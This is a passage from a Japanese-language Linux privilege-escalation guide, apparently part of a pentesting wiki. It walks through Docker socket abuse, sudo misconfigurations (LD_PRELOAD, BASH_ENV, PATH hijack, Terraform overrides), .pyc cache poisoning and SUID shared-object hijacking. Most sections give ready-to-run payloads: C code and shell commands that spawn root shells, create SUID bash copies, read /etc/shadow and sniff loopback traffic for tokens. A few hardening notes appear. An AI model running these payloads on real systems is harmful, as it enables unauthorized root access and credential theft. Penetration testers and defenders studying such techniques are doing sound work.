- `ExecStopPre`、`ExecStopPost`: listening **sockets**/FIFOs がそれぞれ **closed** および removed される **前** または **後** に **executed** される追加の **commands** です。
- `Service`: **incoming traffic** に対して **activate** する **service** unit name を指定します。この設定は Accept=no の sockets でのみ許可されます。デフォルトでは、socket と同じ name（suffix は置き換えられます）を持つ service が使用されます。ほとんどの場合、この option を使用する必要はありません。

### Writable .socket files

**writable** な `.socket` file を見つけた場合、`[Socket]` section の先頭に `ExecStartPre=/home/kali/sys/backdoor` のような記述を **add** できます。すると、socket が created される前に backdoor が executed されます。そのため、**machine が reboot されるまで待つ必要がある可能性が高くなります。**\
_システムがその socket file configuration を使用していなければ、backdoor は executed されないことに注意してください_

### Socket activation + writable unit path (create missing service)

もう 1 つの影響度の高い misconfiguration は次のとおりです。

- `Accept=no` および `Service=<name>.service` を持つ socket unit
- 参照されている service unit が存在しない
- attacker が `/etc/systemd/system`（または別の unit search path）に write できる

この場合、attacker は `<name>.service` を create し、その後 socket への traffic を trigger することで、systemd に新しい service を load させ、root として execute できます。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能な socket

**書き込み可能な socket を特定した場合**（ここで扱っているのは Unix Sockets であり、設定用の `.socket` ファイルではありません）、その socket と**通信でき**、脆弱性を exploit できる可能性があります。

### Unix Sockets の列挙
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**

{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

**HTTP** リクエストを待ち受けている **socket** が存在する場合があります（ここで言っているのは `.socket` ファイルではなく、unix socket として機能するファイルです）。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP** リクエストに**応答する**場合、そのソケットと**通信**でき、場合によっては**脆弱性を exploit**できます。

### Writable Docker Socket

Docker socket（多くの場合 `/var/run/docker.sock` にあります）は、セキュリティを確保すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権を持っていると、privilege escalation につながる可能性があります。ここでは、その方法と、Docker CLI が利用できない場合の代替手段について説明します。

#### **Privilege Escalation with Docker CLI**

Docker socket への書き込みアクセス権がある場合、以下のコマンドを使用して privilege escalation できます。<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使用すると、ホストのファイルシステムに root レベルでアクセスできるコンテナを実行できます。

#### **Docker API を直接使用**

Docker CLI を利用できない場合でも、Unix ソケット上で raw HTTP を使用することで、Docker ソケットを悪用できます。最も信頼性の高い手順は次のとおりです。

- ホストの root を bind mount した、長時間稼働するヘルパーコンテナを作成する
- それを起動する
- そのヘルパー内に `exec` インスタンスを作成する
- `exec` インスタンスを起動し、API 経由で出力を読み取る

**Docker イメージを一覧表示**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**ヘルパーコンテナを作成して起動する**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**exec インスタンスを作成**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**exec instanceを起動して出力を読み取る**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
このパターンは、`socat` や `nc -U` を使って手動で `attach` を操作しようとするより、通常は堅牢です。`/:/host` を使って helper を作成できれば、追加の `exec` インスタンスを使用して `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、host の startup files を変更したりできます。

### Others

**group `docker` の内部にいる**ために docker socket への write permissions がある場合、[**privileges を escalate する方法がさらにあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**docker API が port で listen している**場合は、それを compromise することもできます](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**containers から break out したり、container runtimes を abuse して privileges を escalate したりする方法**については、以下を確認してください:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` **command**を使用できることがわかった場合は、以下の page を読んでください。**privileges を escalate するために abuse できる可能性があります**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` **command**を使用できることがわかった場合は、以下の page を読んでください。**privileges を escalate するために abuse できる可能性があります**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、applications が効率的に相互作用し、data を共有できる高度な **inter-Process Communication (IPC) system** です。modern Linux system を念頭に設計されており、さまざまな形式の application communication に対応する堅牢な framework を提供します。<sup>[[16]](#references)</sup>

この system は汎用性が高く、process 間の data exchange を強化する基本的な IPC をサポートしており、**enhanced UNIX domain sockets** を想起させます。さらに、events や signals の broadcast にも役立ち、system components 間のシームレスな integration を促進します。たとえば、incoming call を知らせる Bluetooth daemon からの signal によって music player が mute され、user experience が向上します。また、D-Bus は remote object system をサポートしており、applications 間の service requests や method invocations を簡素化します。これにより、従来は複雑だった processes が効率化されます。

D-Bus は **allow/deny model** で動作し、matching policy rules の累積効果に基づいて message permissions（method calls、signal emissions など）を管理します。これらの policies は bus との interactions を指定するもので、permissions の exploitation によって privilege escalation が可能になる場合があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にある policy の例では、root user が `fi.w1.wpa_supplicant1` の messages を own、send、receive するための permissions が詳しく定義されています。

user または group が指定されていない policies は universal に適用されます。一方、「default」context の policies は、他の specific policies の対象になっていないすべてのものに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication の enumerate と exploit の方法はこちら：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、マシンの位置を把握するのは常に興味深いことです。

### 一般的な enumerate
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering のクイックトリアージ

ホスト上でコマンドを実行できるものの callback に失敗する場合は、DNS、transport、proxy、route の filtering を迅速に切り分けます：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 開いているポート

アクセスする前に、これまで対話できなかったマシン上で実行されているネットワークサービスを必ず確認します。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
リスナーを bind target で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: local-only（tunnel/forward の候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達可能です。

### Local-only service triage workflow

ホストを compromise すると、`127.0.0.1` に bind されたサービスに、初めて shell から到達できるようになることがよくあります。簡単な local workflow は次のとおりです。
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

ローカルのPEチェックに加えて、linPEASは特化型のネットワークスキャナーとして実行できます。`$PATH` 内で利用可能なバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、toolingをインストールしません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If `-t` を指定せずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋な network scanner として動作します（残りの privilege-escalation checks はスキップされます）。

### Sniffing

traffic を sniff できるか確認します。可能であれば、認証情報を取得できる場合があります。
```
timeout 1 tcpdump
```
簡単な実践的チェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback（`lo`）は、post-exploitation において特に価値があります。多くの内部専用サービスが、そこに tokens/cookies/credentials を公開しているためです：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今キャプチャし、後で解析する：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### Generic Enumeration

自分が**誰**なのか、どのような**権限**を持っているのか、システムにどの**ユーザー**が存在するのか、どのユーザーが**login**でき、どのユーザーが**root privileges**を持っているのかを確認します。
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** は次を使用します: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与できる可能性のある**グループのメンバー**になっていないか確認します:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

クリップボード内に興味深い内容がないか確認します（可能な場合）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

環境の**パスワードを1つでも知っている**場合は、そのパスワードを使って**各ユーザーとしてログインを試みてください**。

### Su Brute

大量のノイズが発生しても問題なく、コンピューター上に `su` と `timeout` のバイナリが存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーの brute-force を試みることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーの brute-force を試みます。

## Writable PATH abuses

### $PATH

**$PATH 内のいずれかのフォルダーに書き込み可能**であることがわかった場合、**書き込み可能なフォルダー内に backdoor を作成**することで privilege escalation が可能になる場合があります。その際、別のユーザー（理想的には root）が実行する command の名前を付け、その command が $PATH 内で書き込み可能なフォルダーより**前に位置するフォルダーから読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使って一部の command を実行することを許可されている場合や、suid bit が設定されている場合があります。次のコマンドで確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドを使うと、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能になります**。<sup>[[8]](#references)</sup> 例:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーはパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `vim` を `root` として実行できます。root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで、簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

この directive により、ユーザーは何かを実行する際に **環境変数を設定** できます:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer をベースにしており**、root としてスクリプトを実行する際に任意の Python ライブラリをロードする **PYTHONPATH hijacking** に対して**脆弱**でした。
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports における書き込み可能な `__pycache__` / `.pyc` poisoning

**sudo-allowed Python script** が、package directory に **書き込み可能な `__pycache__`** を含む module を import している場合、cached `.pyc` を置き換え、次回の import 時に privileged user として code execution を取得できる可能性があります。<sup>[[30]](#references)</sup>

- 動作する理由:
- CPython は bytecode cache を `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
- interpreter は **header**（source に紐付いた magic + timestamp/hash metadata）を検証し、その後、header の後に保存された marshaled code object を実行します。
- directory が writable であるため cached file を **delete and recreate** できる場合、root-owned で non-writable な `.pyc` でも置き換えられます。
- Typical path:
- `sudo -l` に、root として実行できる Python script または wrapper が表示される。
- その script が `/opt/app/`、`/usr/local/lib/...` などから local module を import する。
- imported module の `__pycache__` directory が user または全員によって writable である。

簡易列挙:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
特権スクリプトを調査できる場合は、import されたモジュールとそのキャッシュパスを特定します:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
悪用の手順:

1. sudo が許可された script を一度実行し、正規の cache file がまだ存在しない場合は、Python に作成させる。
2. 正規の `.pyc` から最初の 16 bytes を読み取り、poisoned file で再利用する。
3. payload の code object をコンパイルして `marshal.dumps(...)` し、元の cache file を削除して、元の header と悪意のある bytecode を結合した内容で再作成する。
4. sudo が許可された script を再実行し、import によって root として payload を実行させる。

重要な注意点:

- 元の header を再利用することが重要。Python は bytecode の本体が source と実際に一致するかではなく、cache metadata と source file の整合性を確認するため。
- これは特に、source file が root 所有で書き込み不可だが、格納先の `__pycache__` directory には書き込み可能な場合に有効。
- privileged process が `PYTHONDONTWRITEBYTECODE=1` を使用している場合、safe permissions が設定された場所から import している場合、または import path 内のすべての directory への書き込み権限が削除されている場合、攻撃は失敗する。

最小限の proof-of-concept の形:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- 特権 Python import path 内のディレクトリが、`__pycache__` を含め、低権限ユーザーによって書き込み可能になっていないことを確認する。
- 特権実行では、`PYTHONDONTWRITEBYTECODE=1` の使用と、予期しない書き込み可能な `__pycache__` ディレクトリを定期的にチェックすることを検討する。
- 書き込み可能なローカル Python モジュールや書き込み可能な cache ディレクトリは、root によって実行される書き込み可能な shell script や shared library と同じように扱う。

### sudo env_keep によって保持された BASH_ENV → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の non-interactive startup behavior を利用して、許可された command の実行時に root として arbitrary code を実行できる。<sup>[[24]](#references)</sup>

- 動作する理由: non-interactive shell では、Bash は target script を実行する前に `$BASH_ENV` を評価し、その file を source する。多くの sudo rule では、script または shell wrapper の実行が許可されている。`BASH_ENV` が sudo によって保持される場合、自分の file が root privileges で source される。<sup>[[23]](#references)</sup>

- Requirements:
- 実行可能な sudo rule（`/bin/bash` を non-interactively 呼び出す任意の target、または任意の bash script）。
- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo で許可されたコマンドに shell wrapper を使用せず、最小限のバイナリを使用する。
- 保持された環境変数が使用された場合に備え、sudo の I/O logging と alerting を検討する。

### sudo 経由の Terraform と保持された HOME（!env_reset）

sudo が環境をそのまま保持する場合（`!env_reset`）、`$HOME` は呼び出し元ユーザーのままになる。そのため Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を適用する。<sup>[[25]](#references)</sup>

- 必要な provider を書き込み可能なディレクトリに向け、provider 名に基づく悪意のある plugin（例：`terraform-provider-examples`）を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、停止する前に payload を root として実行し、SUID shell を残します。

### TF_VAR による overrides + symlink validation bypass

Terraform の変数は `TF_VAR_<name>` 環境変数で指定できます。sudo が環境を保持すると、これらの環境変数も残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような脆弱な validation は、symlinks を使って bypass できます:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはsymlinkを解決し、実際の`/root/root.txt`をattackerが読み取り可能なdestinationにコピーします。同じアプローチを使用して、privileged pathsへの**write**も可能です。これには、destination symlinkを事前に作成し、providerのdestination pathを`/etc/cron.d/`内などに向けます。

### requiretty / !requiretty

一部の古いdistributionでは、sudoを`requiretty`付きで設定できます。これにより、sudoはinteractive TTYからのみ実行されます。`!requiretty`が設定されている場合（またはこのoptionが存在しない場合）、sudoはreverse shells、cron jobs、scriptsなどのnon-interactive contextsから実行できます。
```bash
Defaults !requiretty
```
これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を拡大します。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示されるか、攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudo で許可された対象内の相対パスによるコマンドは、同名の別コマンドで shadowing できます。<sup>[[3]](#references)</sup>

- 要件: 絶対パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプトまたはバイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、検索順の先頭にある書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudoでパスを迂回して実行
**Jump**して他のファイルを読み取ったり、**symlink**を使用したりします。たとえば、sudoersファイルでは次のようになります: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**wildcard**（\*）を使用すると、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定しない Sudo command/SUID binary

**sudo permission** が単一のコマンドに対して**パスを指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することでこれを exploit できます
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この technique は、**suid** binary がパスを指定せずに別の command を **executes** する場合にも使用できます（奇妙な SUID binary の内容は、必ず _**strings**_ で確認してください）。

[実行する Payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### コマンドパスを指定する SUID binary

**suid** binary がパスを指定して別の command を **executes** する場合は、その suid file が呼び出している command と同じ名前の **function を export** してみることができます。

たとえば、suid binary が _**/usr/sbin/service apache2 start**_ を呼び出す場合は、function を作成して export してみます。
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、SUID binary を呼び出すと、この関数が実行されます

### SUID wrapper によって実行される書き込み可能な script

一般的な custom-app の設定ミスとして、script を実行する root 所有の SUID binary wrapper があり、その script 自体が低権限ユーザーによって書き込み可能になっているケースがあります。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` が書き込み可能な場合、payload コマンドを追加してから SUID wrapper を実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
簡単な確認:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
この攻撃経路は、`/usr/local/bin` に配置された「maintenance」/「backup」wrapper で特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべての shared library より先に loader が読み込む 1 つ以上の shared library（.so ファイル）を指定するために使用されます。この処理は、library の preloading と呼ばれます。

ただし、システムの security を維持し、この機能が悪用されること、特に **suid/sgid** executable に対する悪用を防ぐため、システムでは一定の条件が適用されます。

- real user ID（_ruid_）が effective user ID（_euid_）と一致しない executable では、loader は **LD_PRELOAD** を無視します。
- suid/sgid の executable では、standard path にあり、かつ suid/sgid である library のみが preload されます。

`sudo` を使用して command を実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、privilege escalation が可能になります。この設定により、`sudo` で command を実行する場合でも **LD_PRELOAD** 環境変数が維持され認識されるため、昇格された privilege で任意の code が実行される可能性があります。<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存する
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、以下を使用して**コンパイル**します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御できる場合、ライブラリが検索されるパスを制御できるため、同様の privesc が悪用される可能性があります。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** permissionsを持つ、通常とは異なるバイナリに遭遇した場合、**.so** filesを適切に読み込んでいるか確認するのが有効です。これは次のコマンドを実行して確認できます:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、exploit の可能性が示唆されます。

これを exploit するには、まず _"/path/to/.config/libcalc.c"_ などのCファイルを作成し、次のコードを含めます：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、権限が昇格された shell を実行することで、privilege escalation を目指します。

上記の C ファイルを、以下のコマンドで shared object (.so) ファイルにコンパイルします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID binary を実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダから library を読み込む SUID binary が見つかったので、そのフォルダに必要な名前で library を作成しましょう。
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが表示された場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という名前の関数が必要です。

### GTFOBins

